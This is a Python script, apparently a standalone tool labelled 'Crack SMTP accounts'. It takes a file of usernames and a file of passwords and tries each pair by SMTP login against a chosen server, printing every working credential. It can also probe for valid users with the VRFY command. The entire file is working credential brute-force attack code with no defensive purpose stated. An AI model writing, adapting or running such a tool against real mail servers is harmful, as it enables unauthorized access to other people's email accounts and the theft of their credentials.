#!/usr/bin/python3
#coding: utf-8

from ast import arg
import os
import sys
import time
import random
import string
import hashlib
import argparse
import subprocess
from smtplib import SMTP
from email.mime.text import MIMEText
from email.header import Header
from email.utils import formataddr
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

argparser = argparse.ArgumentParser(description='Crack SMTP accounts')
argparser.add_argument('-l', '--logins', help='File list of accounts', required=True)
argparser.add_argument('-p', '--passwords', help='File list of passwords', required=True)
argparser.add_argument('-s', '--server', help='SMTP server', required=True)
argparser.add_argument('--verify-users', help='Verify accounts, this option use SMTP VRFY ... but Many sites disable SMTP VRFY in order to foil spammers.', action='store_true')


class SMTP_Bruter(object):
    def __init__(self, host, port=25):
        self.host = host
        self.port = port
 
    def setter(self, host, port):
        self.host = host
        self.port = port
    
    def getter(self):
        return self.host, self.port

    def verify(self, user, pwd):
        try:
            smtp = SMTP(self.host, self.port)
            smtp.login(user, pwd)
            return True
        except Exception as e:
            return False
    
    def load_wordlist(self, wordlist):
        with open(wordlist, 'r') as f:
            return f.readlines()
        
    def load_usernameslist(self, usernameslist):
        with open(usernameslist, 'r') as f:
            return f.readlines()
    
    def verify_user(self, user):
        try:
            smtp = SMTP(self.host, self.port)
            code, fulladdr = smtp.verify(user)
            if code == 250:
                print ('[+] User: %s is valid' % user)
                print ('[+] Full Address: %s' % fulladdr)
                return True
            else:
                return False
            return True
        except Exception as e:
            return False

    def brute_force(self, user, wordlist):
        for pwd in wordlist:
            pwd = pwd.strip('\n')
            if self.verify_user(user):
                if self.verify(user, pwd):
                    print ('[+] User: %s Password: %s' % (user, pwd))
                    return True
                else:
                    print ('[-] User: %s Password is not: %s' % (user, pwd))
                    
            else:
                print ('[-] User: %s is not valid' % user)
                
        return False
    
    def brute_force_users(self, usernameslist, wordlist):
        for user in usernameslist:
            user = user.strip('\n')
            if self.brute_force(user, wordlist):
                return True
        return False
    

def main():
    args = argparser.parse_args()
    smtp = SMTP_Bruter(args.server)
    wordlist = smtp.load_wordlist(args.passwords)
    usernameslist = smtp.load_usernameslist(args.logins)
    if args.verify_users:
        smtp.verify_user(usernameslist[0])
    else:
        smtp.brute_force_users(usernameslist, wordlist)

if __name__ == '__main__':
    main()
